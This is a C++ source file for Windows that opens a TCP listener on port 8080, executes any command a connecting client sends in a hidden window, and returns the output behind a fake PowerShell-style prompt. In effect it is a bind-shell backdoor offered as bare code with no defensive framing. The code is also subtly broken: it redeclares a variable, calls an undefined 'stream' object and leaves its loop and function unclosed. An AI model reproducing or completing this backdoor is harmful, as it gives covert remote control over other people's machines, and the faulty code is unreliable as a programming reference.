#include <iostream>
#include <string>
#include <WinSock2.h>
#include <Windows.h>

#pragma comment(lib, "ws2_32.lib")

using namespace std;

int main() {
    // Define IP and Port
    string IP = "127.0.0.1";
    int PORT = 8080;

    // Create the listener
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    SOCKET listener = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    SOCKADDR_IN addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(IP.c_str());
    addr.sin_port = htons(PORT);
    bind(listener, (SOCKADDR*)&addr, sizeof(addr));
    listen(listener, SOMAXCONN);

    // Wait for a connection
    SOCKET client = accept(listener, NULL, NULL);

    // Send a message to the client
    string message = "New Client Connected";
    send(client, message.c_str(), message.length(), 0);

    // Receive commands from the client
    while (true) {
        char recvbuf[1024];
        int bytes = recv(client, recvbuf, sizeof(recvbuf), 0);
        string receivedText = string(recvbuf, bytes);

        // Execute the command and send the output back to the client
        string output = "";
        SECURITY_ATTRIBUTES sa;
        sa.nLength = sizeof(SECURITY_ATTRIBUTES);
        sa.bInheritHandle = TRUE;
        sa.lpSecurityDescriptor = NULL;
        HANDLE hReadPipe, hWritePipe;
        CreatePipe(&hReadPipe, &hWritePipe, &sa, 0);
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(STARTUPINFO));
        si.cb = sizeof(STARTUPINFO);
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.hStdError = hWritePipe;
        si.hStdOutput = hWritePipe;
        si.wShowWindow = SW_HIDE;
        CreateProcess(NULL, (LPSTR)receivedText.c_str(), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
        CloseHandle(hWritePipe);
        DWORD dwRead;
        char buffer[4096];
        while (ReadFile(hReadPipe, buffer, 4096, &dwRead, NULL)) {
            output.append(buffer, dwRead);
        }
        CloseHandle(hReadPipe);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        string output = "PS " + output;
        string final_output = output + "> ";
        char* sendbytes = (char*)final_output.c_str();
        stream.write(sendbytes, final_output.length());
}
